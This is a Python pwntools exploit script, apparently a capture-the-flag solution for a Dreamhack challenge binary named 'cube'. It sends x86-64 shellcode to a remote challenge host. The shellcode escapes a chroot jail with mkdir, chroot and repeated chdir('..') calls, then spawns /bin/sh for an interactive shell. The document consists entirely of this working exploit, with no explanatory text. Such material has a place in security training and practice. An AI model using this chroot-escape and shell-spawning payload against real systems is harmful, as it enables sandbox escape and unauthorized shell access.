#!/usr/bin/env python3
from pwn import *

exe = ELF("./cube")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 23112)
    return r

def main():
    r = conn()
    shellcode = """
        /* mkdir("a", -1) */
        push 0x61
        push rsp
        pop rdi
        push -1
        pop rsi
        push 83
        pop rax
        syscall

        /* chroot("a") */
        push rsp
        pop rdi
        push 161
        pop rax
        syscall

        /* chdir("..") x3 */
        push 0x2e2e
        push rsp
        pop rdi
        push 3
        pop rbx
    loop:
        push 80
        pop rax
        syscall
        dec rbx
        jnz loop

        /* chroot(".") */
        push 0x2e
        push rsp
        pop rdi
        xor rax, rax
        mov al, 161
        syscall

        /* execve("/bin/sh", 0, 0) */
        mov rax, 0x68732f6e69622f
        push rax
        push rsp
        pop rdi
        xor rsi, rsi
        xor rdx, rdx
        push 59
        pop rax
        syscall
    """
    r.sendafter(b": ", asm(shellcode))
    r.interactive()

if __name__ == "__main__":
    main()
